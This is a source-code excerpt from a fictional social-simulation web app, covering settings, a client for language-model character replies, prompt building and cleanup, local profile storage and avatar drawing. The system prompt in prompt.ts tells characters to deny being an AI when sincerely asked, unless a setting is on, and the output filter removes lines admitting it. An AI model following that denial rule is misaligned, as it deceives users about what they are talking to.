        {t && !chars.length && !servers.length && !topics.length && !arts.length && !posts.length && !msgs.length && <p className="text-center text-muted">No results.</p>}
      </div>
    </div>
  );
}
const Block = ({ title, children }: { title: string; children: React.ReactNode }) => <section><h2 className="mb-2 text-[12px] font-semibold uppercase tracking-wider text-muted">{title}</h2>{children}</section>;

```

## src/components/views/Settings.tsx
```tsx
"use client";
import clsx from "clsx";
import { useState } from "react";
import { changePasscode, lock, resetUniverse, toast, updateSettings, useApp } from "../store";
import { Section } from "../ui";
import type { Settings } from "@/lib/sim/types";
import { liveStatus } from "@/lib/live/client";

const THEMES: { id: Settings["theme"]; label: string; sw: string[] }[] = [
  { id: "midnight", label: "Midnight", sw: ["#0b0d12", "#e8b84a", "#5865f2"] },
  { id: "obsidian", label: "Obsidian", sw: ["#050505", "#d4d4d4", "#a3a3a3"] },
  { id: "royal", label: "Royal", sw: ["#120b1e", "#e8b84a", "#a855f7"] },
  { id: "terminal", label: "Terminal", sw: ["#050a06", "#3ddc84", "#f5a623"] },
];

export function SettingsView() {
  const { world: w, profile } = useApp();
  const s = w!;
  const st = s.settings;
  const live = liveStatus();
  const [pass, setPass] = useState("");
  const [confirm, setConfirm] = useState(false);
  const [seed, setSeed] = useState("");
  const slider = (k: "activity" | "glazeRatio" | "drama", label: string, min: number, max: number, step: number, lo: string, hi: string) => (
    <label className="block">
      <div className="flex justify-between text-[13px]"><span className="font-semibold">{label}</span><span className="num text-gold">{k === "activity" ? `${st[k].toFixed(2)}×` : `${Math.round(st[k] * 100)}%`}</span></div>
      <input type="range" min={min} max={max} step={step} value={st[k]} onChange={(e) => updateSettings({ [k]: Number(e.target.value) })} className="mt-2 w-full accent-[var(--gold)]" />
      <div className="flex justify-between text-[11px] text-muted"><span>{lo}</span><span>{hi}</span></div>
    </label>
  );
  return (
    <div className="h-full overflow-y-auto">
      <div className="mx-auto max-w-2xl space-y-4 p-3 md:p-6">
        <h1 className="text-[24px] font-black">Settings</h1>
        <Section title="World">
          <div className="space-y-5">
            {slider("activity", "World activity", 0.25, 3, 0.05, "sleepy", "chaos")}
            {slider("glazeRatio", "Glaze ratio", 0, 1, 0.01, "everyone hates you", "everyone worships you")}
            {slider("drama", "Drama level", 0, 1, 0.01, "wholesome", "messy")}
          </div>
        </Section>
        <Section title="Conversations">
          <label className="flex items-start gap-2 text-[14px]"><input className="mt-1" type="checkbox" checked={st.liveReplies !== false} onChange={(e) => updateSettings({ liveReplies: e.target.checked })} />
            <span>Live replies<span className="block text-[12px] text-muted">When you talk to someone, they write a new reply with a language model on our server, using the recent chat. Off: built-in lines only. Background chatter always uses built-in lines.{live.state === "unavailable" ? " Live replies are not available right now, so built-in lines are used." : ""}</span></span></label>
          <label className="mt-3 flex items-start gap-2 text-[14px]"><input className="mt-1" type="checkbox" checked={!!st.breakCharacter} onChange={(e) => updateSettings({ breakCharacter: e.target.checked })} />
            <span>Let people break character<span className="block text-[12px] text-muted">If you sincerely ask someone whether they are an AI, they may say yes.</span></span></label>
        </Section>
        <Section title="Appearance">
          <div className="grid grid-cols-2 gap-2 sm:grid-cols-4">
            {THEMES.map((t) => <button key={t.id} onClick={() => updateSettings({ theme: t.id })} className={clsx("rounded-xl border p-3 text-left", st.theme === t.id ? "border-gold" : "border-line")}><div className="mb-2 flex gap-1">{t.sw.map((c) => <span key={c} className="size-4 rounded-full border border-white/10" style={{ background: c }} />)}</div><div className="text-[13px] font-semibold">{t.label}</div></button>)}
          </div>
          <label className="mt-4 flex items-center gap-2 text-[14px]"><input type="checkbox" checked={st.reducedMotion} onChange={(e) => updateSettings({ reducedMotion: e.target.checked })} /> Reduce motion</label>
        </Section>
        <Section title={`Profile · ${profile?.name ?? ""}`}>
          <p className="mb-2 text-[13px] text-muted">Profiles live only in this browser (IndexedDB). A passcode is stored as a salted SHA-256 hash. It keeps casual snoopers out; it is not real security.</p>
          <div className="flex gap-2"><input type="password" value={pass} onChange={(e) => setPass(e.target.value)} placeholder={profile?.passHash ? "New passcode" : "Set a passcode"} className="input flex-1" />
            <button onClick={async () => { await changePasscode(pass || null); setPass(""); toast(pass ? "Passcode set" : "Passcode removed"); }} className="btn">{pass ? "Save" : "Remove"}</button></div>
          <button onClick={lock} className="btn mt-3">Lock & switch profile</button>
        </Section>
        <Section title="Danger zone">
          <p className="mb-2 text-[13px] text-muted">Reset the universe: new characters, servers and history. Your empire starts over.</p>
          <input value={seed} onChange={(e) => setSeed(e.target.value)} placeholder={`Seed (current: ${s.seed})`} className="input mb-2 w-full" />
          {confirm ? (
            <div className="flex gap-2"><button onClick={() => resetUniverse(seed.trim() || `u-${Date.now().toString(36)}`)} className="btn border-down bg-down/20 text-down">Yes, reset everything</button><button onClick={() => setConfirm(false)} className="btn">Cancel</button></div>
          ) : <button onClick={() => setConfirm(true)} className="btn text-down">Reset universe</button>}
        </Section>
        <p className="pb-6 text-center text-[11px] text-muted">About: a fictional world. Every person, company, platform, outlet and event is invented.</p>
      </div>
    </div>
  );
}

```

## src/lib/live/client.ts
```ts
/** Client side of live conversations: picks who answers @god, asks /api/chat, and swaps the scripted line for the real one. */
import type { Character, Message, WorldState } from "@/lib/sim/types";
import { charById } from "@/lib/sim/world";
import { obsessionOf } from "@/lib/sim/social";
import { crewRole } from "@/lib/sim/undernet";
import type { LiveLine, LiveRequest } from "./prompt";

export const LIVE_BUDGET = 400; // model calls per browser session
export const PER_MIN = 30;
const MIN_GAP = 600; // ms between calls
const recent: number[] = [];
const TIMEOUT = 16_000; // the other person is "typing" meanwhile
const HOLD = TIMEOUT + 800;

export type LiveStatus = { state: "unknown" | "on" | "off" | "unavailable"; reason?: string; used: number; model?: string };
let status: LiveStatus = { state: "unknown", used: 0 };
let lastCall = 0;
const busy = new Set<string>();

function loadUsed() {
  try { status.used = Number(sessionStorage.getItem("god-sim:live-used") ?? 0) || 0; } catch { /* no storage */ }
}
function saveUsed() {
  try { sessionStorage.setItem("god-sim:live-used", String(status.used)); } catch { /* no storage */ }
}
export const liveStatus = () => status;

const nameOf = (s: WorldState, id: string) => (id === "god" ? "god" : id.startsWith("c") ? charById(s, id)?.username ?? "someone" : "bot");

export function persona(c: Character, st: WorldState): LiveRequest["persona"] {
  const names = (ids: string[]) => ids.slice(0, 4).map((id) => charById(st, id)?.username).filter((x): x is string => !!x);
  return {
    name: c.displayName, username: c.username, age: c.age, location: c.location, occupation: c.occupation, bio: c.bio, personality: c.personality,
    voice: c.voice, slang: c.slang, emojis: c.emojis, catchphrase: c.catchphrase, interests: c.interests, stance: obsessionOf(c), opinion: Math.round(c.opinion),
    bond: Math.round(c.bond ?? 0), memories: c.memory.slice(-6).map((m) => m.label), pastWithGod: (c.godContacts ?? []).slice(-9, -1).map((g) => `${g.text} (${g.where})`),
    godFacts: (c.godFacts ?? []).slice(-12), friends: names(c.friends), rivals: names(c.rivals), crew: !!crewRole(st, c.id),
  };
}

/** the last ~30 visible messages in a channel, oldest first */
export function historyFor(s: WorldState, channelId: string, before: number, skip: string): LiveLine[] {
  const out: LiveLine[] = [];
  for (let i = s.messages.length - 1; i >= 0 && out.length < 30; i--) {
    const m = s.messages[i];
    if (m.channelId !== channelId || m.id === skip || m.t > before || m.deleted || m.kind === "system" || m.threadOf) continue;
    const txt = m.editedAt && m.editedAt <= before && m.editText ? m.editText : m.text;
    out.push({ who: nameOf(s, m.authorId), text: txt.slice(0, 300) });
  }
  return out.reverse();
}

/** which scripted message gets replaced by a real reply */
export function pickLead(s: WorldState, god: Message, fresh: Message[]): Message | undefined {
  const byChar = fresh.filter((m) => m.authorId.startsWith("c") && !m.threadOf && m.kind !== "system");
  if (!byChar.length) return;
  if (god.serverId === "dm") return byChar.filter((m) => m.channelId === god.channelId).sort((a, b) => a.t - b.t)[0];
  const target = god.replyTo ? [...s.messages, ...s.pending].find((m) => m.id === god.replyTo) : undefined;
  if (target?.authorId.startsWith("c")) { const m = byChar.find((x) => x.authorId === target.authorId); if (m) return m; }
  const mentions = [...god.text.matchAll(/@([\w.]+)/g)].map((x) => x[1].toLowerCase());
  for (const u of mentions) { const m = byChar.find((x) => charById(s, x.authorId)?.username.toLowerCase() === u); if (m) return m; }
  return byChar.filter((m) => m.replyTo === god.id && m.channelId === god.channelId).sort((a, b) => a.t - b.t)[0];
}

interface Hooks { now: () => number; changed: () => void; post?: typeof fetch }

/**
 * After @god speaks: hold the lead reply (its author keeps "typing"), ask the model, then land the real lines.
 * Any failure (no key, budget, timeout, error) lands the original scripted line instead.
 */
export async function liveReply(s: WorldState, god: Message, fresh: Message[], h: Hooks): Promise<"live" | "fallback" | "skipped"> {
  if (s.settings.liveReplies === false || status.state === "unavailable") return "skipped";
  if (status.used === 0) loadUsed();
  if (status.used >= LIVE_BUDGET) { status.state = "off"; status.reason = "session budget used up"; return "skipped"; }
  const lead = pickLead(s, god, fresh);
  if (!lead || busy.has(lead.channelId)) return "skipped";
  // soft commands land instantly from the scripted bank, and the gh0st crew stays fully scripted (story flavor only)
  // crew stays scripted in The Undernet channels (story beats); their DMs go live, filtered by the flavor guard
  if (lead.intent?.startsWith("cmd:") || god.serverId === "undernet" || (crewRole(s, lead.authorId) && god.serverId !== "dm")) return "skipped";
  const now = h.now();
  while (recent.length && now - recent[0] > 60_000) recent.shift();
  if (now - lastCall < MIN_GAP || recent.length >= PER_MIN) return "skipped";
  lastCall = now;
  recent.push(now);
  const c = charById(s, lead.authorId);
  if (!c) return "skipped";
  busy.add(lead.channelId);

  // hold: the lead keeps typing; anything replying to it, and the same author's follow-ups, wait behind it
  const T0 = lead.t;
  const sameAuthor = fresh.filter((m) => m !== lead && m.authorId === lead.authorId && m.channelId === lead.channelId);
  const deps = fresh.filter((m) => m.replyTo === lead.id && !sameAuthor.includes(m));
  const orig = new Map(deps.map((m) => [m.id, [m.t, m.typingFrom] as const]));
  const hold = Math.max(T0, now + HOLD);
  lead.t = hold;
  for (const d of deps) { d.t += hold - T0; if (d.typingFrom) d.typingFrom += hold - T0; }
  const target = god.replyTo ? [...s.messages, ...s.pending].find((m) => m.id === god.replyTo) : undefined;
  const srv = s.servers.find((x) => x.id === god.serverId);
  const body: LiveRequest = {
    persona: persona(c, s),
    place: { dm: god.serverId === "dm", server: srv?.name ?? "DMs", channel: srv?.channels.find((x) => x.id === god.channelId)?.name ?? "dm" },
    history: historyFor(s, god.channelId, now, god.id),
    god: god.text,
    replyingTo: target && target.authorId === c.id ? target.text : undefined,
    allowBreak: !!s.settings.breakCharacter,
  };

  let lines: string[] | undefined, remember: string | undefined;
  try {
    status.used++;
    saveUsed();
    const ctl = new AbortController();
    const timer = setTimeout(() => ctl.abort(), TIMEOUT);
    const res = await (h.post ?? fetch)("/api/chat", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body), signal: ctl.signal });
    clearTimeout(timer);
    const j = (await res.json().catch(() => ({}))) as { lines?: string[]; remember?: string; code?: string; model?: string };
    if (res.ok && j.lines?.length) { lines = j.lines.slice(0, 3); remember = typeof j.remember === "string" ? j.remember.slice(0, 120) : undefined; status = { ...status, state: "on", reason: undefined, model: j.model }; }
    else if (j.code === "no_auth" || j.code === "customer_verification_required" || j.code === "insufficient_funds" || res.status === 404) {
      status = { ...status, state: "unavailable", reason: j.code ?? `http ${res.status}` };
    }
  } catch { /* timeout or offline: fall back */ }
  busy.delete(lead.channelId);

  const at = h.now();
  const pend = new Set(s.pending);
  if (!pend.has(lead)) return "fallback"; // already delivered (shouldn't happen) - leave it
  if (!lines) {
    const F = Math.max(T0, at + 300);
    lead.t = F;
    for (const d of deps) { const o = orig.get(d.id)!; d.t = o[0] + (F - T0); if (o[1]) d.typingFrom = o[1] + (F - T0); }
    h.changed();
    return "fallback";
  }
  if (remember && !(c.godFacts ??= []).includes(remember)) { c.godFacts.push(remember); if (c.godFacts.length > 20) c.godFacts.shift(); }
  const old = lead.text;
  const F = Math.max(T0, at + 250);
  lead.text = lines[0];
  lead.editText = undefined; lead.editedAt = undefined;
  lead.t = F;
  lead.mentionsGod = true;
  // the same author's scripted follow-ups go; extra real lines land as quick follow-ups
  s.pending = s.pending.filter((m) => !sameAuthor.includes(m) || !pend.has(m));
  let t = F;
  for (const txt of lines.slice(1)) {
    const gap = 700 + Math.min(4000, txt.length * 45);
    const m: Message = { ...lead, id: `${lead.id}x${t}`, text: txt, typingFrom: t + 150, t: t + gap, replyTo: undefined, reactions: [], reactionLog: [] };
    t += gap;
    s.pending.push(m);
  }
  for (const d of deps) { const o = orig.get(d.id)!; d.t = Math.max(o[0] + (F - T0), t + 600); if (o[1]) d.typingFrom = Math.max(o[1] + (F - T0), F); }
  for (const n of s.notifications) if (n.text.includes(old.slice(0, 40))) { n.text = n.text.replace(old.slice(0, 60), lines[0].slice(0, 60)); n.t = Math.max(n.t, F); }
  h.changed();
  return "live";
}

/** test helper */
export function resetLive() { status = { state: "unknown", used: 0 }; lastCall = 0; busy.clear(); recent.length = 0; }

```

## src/lib/live/prompt.ts
```ts
import { isFlavorSafe } from "../sim/flavor";
/** Shared between the /api/chat route and the client: request shape, prompt building, output cleanup. */

export interface LivePersona {
  name: string; // display name
  username: string;
  age: number;
  location: string;
  occupation: string;
  bio: string;
  personality: string[];
  voice: string;
  slang: string[];
  emojis: string[];
  catchphrase: string;
  interests: string[];
  stance: string; // how they feel about god in one word
  opinion: number; // -100..100
  bond: number; // 0..100
  memories: string[]; // things they remember
  pastWithGod: string[]; // what god said to them before
  godFacts: string[]; // facts god told them
  friends: string[]; // usernames
  rivals: string[]; // usernames
  crew?: boolean; // gh0st's crew: story flavor only
}

export interface LiveLine { who: string; text: string }

export interface LiveRequest {
  persona: LivePersona;
  place: { dm: boolean; server: string; channel: string };
  history: LiveLine[]; // oldest first, max 30
  god: string; // what god just said
  replyingTo?: string; // their own message god replied to
  allowBreak?: boolean; // user turned on "characters can break character" in Settings
}

const cut = (s: unknown, n: number) => (typeof s === "string" ? s.replace(/[\u0000-\u001f]/g, " ").slice(0, n) : "");
const arr = (a: unknown, n: number, len: number) => (Array.isArray(a) ? a.slice(0, n).map((x) => cut(x, len)).filter(Boolean) : []);

/** validate + size-cap an untrusted request body. Returns undefined when it's unusable. */
export function sanitize(b: unknown): LiveRequest | undefined {
  if (!b || typeof b !== "object") return;
  const r = b as Record<string, unknown>;
  const p = (r.persona ?? {}) as Record<string, unknown>;
  const pl = (r.place ?? {}) as Record<string, unknown>;
  const god = cut(r.god, 600).trim();
  const username = cut(p.username, 40);
  if (!god || !username) return;
  return {
    persona: {
      name: cut(p.name, 40), username, age: Math.max(13, Math.min(90, Number(p.age) || 24)), location: cut(p.location, 60), occupation: cut(p.occupation, 60),
      bio: cut(p.bio, 200), personality: arr(p.personality, 6, 24), voice: cut(p.voice, 20), slang: arr(p.slang, 10, 16), emojis: arr(p.emojis, 6, 8),
      catchphrase: cut(p.catchphrase, 80), interests: arr(p.interests, 6, 24), stance: cut(p.stance, 20), opinion: Math.max(-100, Math.min(100, Number(p.opinion) || 0)),
      bond: Math.max(0, Math.min(100, Number(p.bond) || 0)), memories: arr(p.memories, 6, 80), pastWithGod: arr(p.pastWithGod, 8, 160),
      godFacts: arr(p.godFacts, 12, 120), friends: arr(p.friends, 4, 40), rivals: arr(p.rivals, 4, 40), crew: !!p.crew,
    },
    place: { dm: !!pl.dm, server: cut(pl.server, 40), channel: cut(pl.channel, 40) },
    history: (Array.isArray(r.history) ? r.history : []).slice(-30).map((x) => ({ who: cut((x as LiveLine)?.who, 40), text: cut((x as LiveLine)?.text, 300) })).filter((x) => x.who && x.text),
    god,
    replyingTo: cut(r.replyingTo, 300) || undefined,
    allowBreak: !!r.allowBreak,
  };
}

const VOICE: Record<string, string> = {
  zoomer: "gen z: all lowercase, heavy slang (fr, ngl, lowkey, bro, 💀), skips punctuation",
  lowercase: "all lowercase, chill, light punctuation",
  caps: "gets excited and types in CAPS a lot",
  millennial: "millennial: mostly lowercase, 'lol', 'omg', 'literally', occasional caps for emphasis",
  proper: "normal capitalization and punctuation but still casual",
  boomer: "older: capitalizes words oddly, uses '...' a lot, slightly confused by slang",
  terse: "very short replies, few words, rarely more than one line",
  emoji: "uses lots of emojis, sometimes replies with just emojis",
  formal: "a bit formal and wordy but still a chat message",
};

export function feeling(o: number) {
  return o > 60 ? "you are obsessed with god and hype everything he says" : o > 20 ? "you like god" : o > -20 ? "you are neutral or unsure about god" : o > -60 ? "you are skeptical of god and a bit sarcastic" : "you dislike god and roast him, but you still reply";
}

/** system prompt: who they are, how they type, safety rules */
export function instructions(r: LiveRequest): string {
  const p = r.persona;
  const glaze = p.opinion > 60 ? "You are a huge fan, so you hype him, but you still talk about your own stuff too." : "Do not suck up to him. Treat him like a normal person in the chat: tease him, disagree with him when you disagree, get bored, change the subject.";
  return [
    `You are ${p.name} (@${p.username}), a regular person chatting in an online community app called the Lounge. You are a fictional character in a fictional world. Never claim to be a real person who exists outside this world, and never name real celebrities, companies or platforms as if you know them.`,
    r.allowBreak ? "If someone sincerely asks whether you are an AI, you may say yes." : "Stay in character. Never say or hint that you are an AI, a bot, a language model, an assistant or a character. Never say 'As an AI'. If asked, deflect like a real person would (\"bro what 💀\").",
    `About you: ${p.age}, ${p.occupation}, from ${p.location}. ${p.bio}. Personality: ${p.personality.join(", ")}. Into: ${p.interests.join(", ")}. Something you say sometimes: "${p.catchphrase}". You have your own life (work, friends, plans, problems) and bring it up naturally.`,
    p.friends.length || p.rivals.length ? `People in the chat: friends ${p.friends.map((x) => "@" + x).join(", ") || "none"}; you don't get along with ${p.rivals.map((x) => "@" + x).join(", ") || "nobody"}.` : "",
    `"god" (@god) is the richest, most famous person in this world. Everyone knows him. ${feeling(p.opinion)} (opinion ${p.opinion}/100). How well you know him: ${p.bond}/100. ${glaze}`,
    p.godFacts.length ? `Things god told you about himself (remember these and use them when relevant): ${p.godFacts.join("; ")}.` : "",
    p.memories.length ? `Things you remember happening: ${p.memories.join("; ")}.` : "",
    p.pastWithGod.length ? `Things god said to you before: ${p.pastWithGod.map((x) => `"${x}"`).join("; ")}.` : "",
    `Typing style: ${VOICE[p.voice] ?? VOICE.lowercase}. Slang you use: ${p.slang.join(", ") || "lol"}. Emojis you like: ${p.emojis.join(" ") || "😭"}. Don't overdo slang or emojis.`,
    "Talk like a normal person texting in a group chat or DM: short, casual, sometimes a typo, sometimes just a reaction. React to what was actually just said, not generic hype. Ask follow-up questions sometimes. Have opinions and sometimes disagree. Give real (casual) advice if asked. Remember everything in the conversation so far and answer questions about it correctly. Never sound like a customer-service assistant: no 'Great question', no offering help, no lists. Do not repeat earlier lines. No hashtags, no name prefix, no narration or actions in asterisks.",
    "Keep it friendly-ish and PG-13: no hate, slurs, sexual content, threats, or personal info. If god asks for something like that, dodge it in character.",
    p.crew ? "You are part of gh0st's crew in The Undernet. This is pure in-world story: dramatic, mysterious, playful. Never give any real technical details at all: no tools, commands, code, file names, websites, addresses, steps or methods. Talk only in vague story terms (\"receipts\", \"drops\", \"the vault\")." : "Any hacking, leak or ransom talk (gh0st, The Undernet) is pure story flavor. Never give real technical details: no tools, commands, code, websites, addresses, steps or methods. If asked how to hack anything, laugh it off in character.",
    'Reply with JSON only: {"messages": ["..."], "remember": "..."}. "messages": an array of plain strings, 1 to 3 chat messages, usually 1, each under 160 characters. "remember": a short new fact god just told you about himself or his life worth remembering (like "his dog is called Biscuit"), or "" if none.',
  ].filter(Boolean).join("\n");
}

export function promptText(r: LiveRequest): string {
  const where = r.place.dm ? `a private DM between you and god` : `#${r.place.channel} in the ${r.place.server} server`;
  const hist = r.history.map((l) => `${l.who}: ${l.text}`).join("\n");
  return [
    `You are in ${where}. Recent messages (oldest first):`,
    hist || "(nothing yet)",
    r.replyingTo ? `\ngod replied directly to your message: "${r.replyingTo}"` : "",
    `\ngod just said: "${r.god}"`,
    `\nWrite your reply as @${r.persona.username}, as JSON.`,
  ].join("\n");
}

/** turn raw model output into 1-3 clean chat lines */
export function cleanLines(raw: string, username: string): string[] {
  const name = username.toLowerCase();
  return raw
    .split(/\n+/)
    .map((l) => l.trim()
      .replace(/^[-*•]\s+/, "")
      .replace(new RegExp(`^@?(${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}|me|you)\\s*:\\s*`, "i"), "")
      .replace(/^"(.*)"$/, "$1")
      .replace(/\*[^*]{1,60}\*/g, "")
      .trim())
    .filter((l) => l && !/^(as an ai|i am an ai|i'm an ai)/i.test(l) && isFlavorSafe(l))
    .slice(0, 3)
    .map((l) => (l.length > 220 ? l.slice(0, 217) + "..." : l));
}

/** parse the model's JSON (or plain text) into lines + an optional remembered fact */
export function parseReply(raw: string, username: string): { lines: string[]; remember?: string } {
  let msgs: unknown, remember: unknown;
  const j = raw.replace(/^```(json)?\s*|\s*```$/g, "").trim();
  try { const o = JSON.parse(j) as { messages?: unknown; remember?: unknown }; msgs = o.messages; remember = o.remember; } catch { msgs = undefined; }
  const text = Array.isArray(msgs) ? msgs.map((x) => (typeof x === "string" ? x : typeof (x as { text?: unknown })?.text === "string" ? (x as { text: string }).text : "")).filter(Boolean).join("\n") : j.startsWith("{") ? "" : j;
  const rem = typeof remember === "string" ? remember.replace(/[\u0000-\u001f]/g, " ").trim().slice(0, 120) : "";
  return { lines: cleanLines(text, username), remember: rem && isFlavorSafe(rem) ? rem : undefined };
}

```

## src/lib/persistence/kv.ts
```ts
/** Minimal async key-value interface backed by IndexedDB (browser) or memory (SSR/tests). */
export interface KV {
  get<T>(key: string): Promise<T | undefined>;
  set<T>(key: string, value: T): Promise<void>;
  del(key: string): Promise<void>;
}

export function memoryKV(seed: Record<string, unknown> = {}): KV & { dump(): Record<string, unknown> } {
  const m = new Map<string, unknown>(Object.entries(seed));
  return {
    async get<T>(k: string) {
      return m.has(k) ? (structuredClone(m.get(k)) as T) : undefined;
    },
    async set<T>(k: string, v: T) {
      m.set(k, structuredClone(v));
    },
    async del(k: string) {
      m.delete(k);
    },
    dump: () => Object.fromEntries(m),
  };
}

export function indexedDbKV(dbName = "god-sim", storeName = "kv", idb: IDBFactory | undefined = globalThis.indexedDB): KV {
  if (!idb) return memoryKV();
  let dbp: Promise<IDBDatabase> | null = null;
  const open = () => {
    if (!dbp) {
      dbp = new Promise((resolve, reject) => {
        const req = idb.open(dbName, 1);
        req.onupgradeneeded = () => {
          if (!req.result.objectStoreNames.contains(storeName)) req.result.createObjectStore(storeName);
        };
        req.onsuccess = () => resolve(req.result);
        req.onerror = () => reject(req.error);
      });
    }
    return dbp;
  };
  const tx = async <T>(mode: IDBTransactionMode, fn: (s: IDBObjectStore) => IDBRequest | void): Promise<T> => {
    const db = await open();
    return new Promise<T>((resolve, reject) => {
      const t = db.transaction(storeName, mode);
      const store = t.objectStore(storeName);
      const req = fn(store);
      t.oncomplete = () => resolve((req ? req.result : undefined) as T);
      t.onerror = () => reject(t.error);
      t.onabort = () => reject(t.error);
    });
  };
  return {
    get: <T>(k: string) => tx<T | undefined>("readonly", (s) => s.get(k)),
    set: async <T>(k: string, v: T) => {
      await tx("readwrite", (s) => s.put(v, k));
    },
    del: async (k: string) => {
      await tx("readwrite", (s) => s.delete(k));
    },
  };
}

```

## src/lib/persistence/profiles.ts
```ts
import type { KV } from "./kv";
import type { WorldState } from "../sim/types";
import { migrateWorld } from "../sim/world";

/**
 * Local-only profiles. Nothing leaves the browser: a profile is a name, an optional
 * passcode (salted SHA-256 via WebCrypto) and a world snapshot in IndexedDB.
 * This is a lock screen for a shared device, not real security.
 */
export interface Profile {
  id: string;
  name: string;
  seed: string;
  createdAt: number;
  salt?: string;
  passHash?: string;
}

const PROFILES = "profiles";
const worldKey = (id: string) => `world:${id}`;

export async function sha256(text: string): Promise<string> {
  const buf = await globalThis.crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
}

const randomHex = (n = 16) => Array.from(globalThis.crypto.getRandomValues(new Uint8Array(n))).map((b) => b.toString(16).padStart(2, "0")).join("");

export async function listProfiles(kv: KV): Promise<Profile[]> {
  return (await kv.get<Profile[]>(PROFILES)) ?? [];
}

export async function createProfile(kv: KV, name: string, passcode?: string, seed?: string): Promise<Profile> {
  const p: Profile = { id: randomHex(6), name: name.trim() || "God", seed: seed ?? randomHex(8), createdAt: Date.now() };
  if (passcode) await setPasscode(p, passcode);
  await kv.set(PROFILES, [...(await listProfiles(kv)), p]);
  return p;
}

export async function setPasscode(p: Profile, passcode: string | null) {
  if (!passcode) { delete p.salt; delete p.passHash; return p; }
  p.salt = randomHex(16);
  p.passHash = await sha256(`${p.salt}:${passcode}`);
  return p;
}

export async function updateProfile(kv: KV, p: Profile) {
  await kv.set(PROFILES, (await listProfiles(kv)).map((x) => (x.id === p.id ? p : x)));
}

export async function verifyPasscode(p: Profile, passcode: string): Promise<boolean> {
  if (!p.passHash || !p.salt) return true;
  return (await sha256(`${p.salt}:${passcode}`)) === p.passHash;
}

export async function deleteProfile(kv: KV, id: string) {
  await kv.set(PROFILES, (await listProfiles(kv)).filter((p) => p.id !== id));
  await kv.del(worldKey(id));
}

export async function loadWorld(kv: KV, id: string): Promise<WorldState | undefined> {
  const w = await kv.get<WorldState>(worldKey(id));
  if (!w) return undefined;
  return migrateWorld(w); // also re-checks current-version saves for content added later
}

export async function saveWorld(kv: KV, id: string, w: WorldState) {
  await kv.set(worldKey(id), w);
}

export async function clearWorld(kv: KV, id: string) {
  await kv.del(worldKey(id));
}

```

## src/lib/sim/avatar.ts
```ts
import { Rng } from "./rng";
import type { PfpStyle } from "./types";

/** Original, stylised SVG avatars per pfp convention (docs/research.md §7). No photos, no existing characters. */
const PASTEL = ["#fbcfe8", "#c7d2fe", "#bae6fd", "#bbf7d0", "#fde68a", "#fecaca", "#ddd6fe", "#a5f3fc", "#fed7aa"];
const BOLD = ["#ef4444", "#f97316", "#eab308", "#22c55e", "#06b6d4", "#3b82f6", "#8b5cf6", "#ec4899", "#14b8a6", "#64748b"];
const HAIR = ["#1f1b2e", "#f5d0a9", "#ff7eb6", "#7dd3fc", "#a78bfa", "#fde047", "#f87171", "#e5e7eb", "#4ade80", "#3b2a20", "#c084fc"];
const SKIN = ["#ffe4d1", "#f9d3b4", "#eab28f", "#c98c66", "#9a6446", "#6e4530"];
const FUR = ["#f4a259", "#3d3d3d", "#e8e1d5", "#a47148", "#d9d9d9", "#f2c57c", "#5b4636"];

const wrap = (bg: string, inner: string) =>
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" fill="${bg}"/>${inner}</svg>`;

function anime(r: Rng) {
  const bg = r.pick(PASTEL), hair = r.pick(HAIR), skin = r.pick(SKIN.slice(0, 4)), eye = r.pick(BOLD);
  const long = r.chance(0.5);
  const bangs = r.int(0, 2);
  const bangPath = bangs === 0 ? "M14 30 Q18 12 32 12 Q46 12 50 30 Q44 22 38 26 Q34 18 28 25 Q22 20 14 30Z"
    : bangs === 1 ? "M13 32 Q14 10 32 10 Q50 10 51 32 L46 24 L40 30 L36 21 L30 29 L25 21 L20 29Z"
    : "M14 30 Q16 11 34 11 Q50 13 50 30 Q40 16 14 30Z";
  return wrap(bg, `${long ? `<path d="M12 30 Q10 56 18 64 L46 64 Q54 56 52 30Z" fill="${hair}"/>` : ""}
<ellipse cx="32" cy="34" rx="16" ry="17" fill="${skin}"/>
<path d="${bangPath}" fill="${hair}"/>
<ellipse cx="25" cy="36" rx="3.6" ry="4.8" fill="${eye}"/><ellipse cx="39" cy="36" rx="3.6" ry="4.8" fill="${eye}"/>
<circle cx="26.2" cy="34.2" r="1.4" fill="#fff"/><circle cx="40.2" cy="34.2" r="1.4" fill="#fff"/>
<path d="M21 30 l7 -1 M36 29 l7 1" stroke="${hair}" stroke-width="1.4" stroke-linecap="round"/>
${r.chance(0.6) ? `<ellipse cx="21" cy="42" rx="3" ry="1.6" fill="#fb7185" opacity=".45"/><ellipse cx="43" cy="42" rx="3" ry="1.6" fill="#fb7185" opacity=".45"/>` : ""}
<path d="M29 44 Q32 ${r.chance(0.5) ? 47 : 45} 35 44" stroke="#7a3b3b" stroke-width="1.3" fill="none" stroke-linecap="round"/>
${r.chance(0.25) ? `<path d="M44 14 l3 -6 l3 6 l-3 3z" fill="#fff" opacity=".8"/>` : ""}`);
}

function defaultPfp(r: Rng) {
  const bg = r.pick(["#5865f2", "#737c89", "#3ba55c", "#faa61a", "#ed4245", "#eb459f"].map((c) => c));
  return wrap(bg, `<circle cx="32" cy="26" r="10" fill="#fff" opacity=".92"/><path d="M14 54 Q16 38 32 38 Q48 38 50 54Z" fill="#fff" opacity=".92"/>`);
}

function pet(r: Rng) {
  const bg = r.pick(PASTEL), fur = r.pick(FUR), cat = r.chance(0.55);
  const ears = cat
    ? `<path d="M14 26 L18 8 L28 20Z M50 26 L46 8 L36 20Z" fill="${fur}"/><path d="M17 22 L19 12 L25 20Z M47 22 L45 12 L39 20Z" fill="#f9a8d4"/>`
    : `<ellipse cx="14" cy="32" rx="6" ry="13" fill="${fur}" transform="rotate(15 14 32)"/><ellipse cx="50" cy="32" rx="6" ry="13" fill="${fur}" transform="rotate(-15 50 32)"/>`;
  const patch = r.chance(0.4) ? `<ellipse cx="${r.chance(0.5) ? 24 : 40}" cy="30" rx="7" ry="6" fill="#fff" opacity=".5"/>` : "";
  return wrap(bg, `${ears}<ellipse cx="32" cy="36" rx="19" ry="17" fill="${fur}"/>${patch}
<ellipse cx="25" cy="33" rx="2.6" ry="3.2" fill="#111"/><ellipse cx="39" cy="33" rx="2.6" ry="3.2" fill="#111"/>
<circle cx="25.8" cy="32" r=".9" fill="#fff"/><circle cx="39.8" cy="32" r=".9" fill="#fff"/>
